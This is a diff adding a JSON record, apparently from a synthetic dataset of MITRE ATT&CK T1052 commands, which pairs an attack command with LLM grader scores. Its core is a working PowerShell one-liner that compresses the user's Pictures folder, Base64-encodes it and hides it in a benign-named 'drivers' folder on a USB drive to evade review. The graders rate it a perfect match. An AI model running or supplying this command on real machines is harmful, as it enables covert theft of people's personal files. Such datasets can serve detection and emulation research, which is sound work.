@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $tmp=\"$env:TEMP\\pics.zip\"; if(Test-Path $tmp){Remove-Item $tmp -Force}; Compress-Archive -Path \"$env:USERPROFILE\\Pictures\\*\" -DestinationPath $tmp -Force -ErrorAction SilentlyContinue; $dest=\"$dl`:\\drivers\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; if(Test-Path $tmp){ [Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp)) | Set-Content \"$dest\\p.dat\" -Encoding ascii; Remove-Item $tmp -Force; Write-Output \"Compressed and encoded Pictures to $dest\\p.dat at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append }",
+  "explanation": "Compresses local pictures, Base64-encodes the archive, and stores it under a benign-sounding directory on removable media to evade casual review.",
+  "rationale_steps": [
+    "Create a temporary ZIP of target data locally",
+    "Resolve removable drive destination",
+    "Encode the ZIP as Base64 and write to USB",
+    "Log the operation via Write-Output and clean up"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-4fe8ad1a",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with valid cmdlets/parameters, balanced quoting/parentheses, proper separators, and correct escaping to build the drive path.",
+        "semantic_score": 5,
+        "semantic_justification": "It discovers a removable drive, compresses the Pictures folder, base64-encodes the archive, places it in a benign-looking directory on the USB, logs, and deletes the temp file, aligning with T1052 exfiltration over physical media and obfuscation.",
+        "combined_score": 5.0,
+        "confidence": 0.93,
+        "timestamp": "2025-10-01T08:50:56.698409Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable declarations, balanced quotes/parentheses/braces, appropriate command separators, valid cmdlet parameters, and correct error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1052 by automatically detecting removable media, compressing user pictures, encoding them to evade detection, storing them with an innocuous filename in a benign-sounding directory, and logging the operation with timestamps.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:51:00.391083Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced elements, valid cmdlet usage, and proper string interpolation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves its stated intent of compressing, Base64-encoding, and exfiltrating data to a removable medium, aligning precisely with the T1052 technique's characteristics like staging, obfuscation, and transfer over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:51:10.147148Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
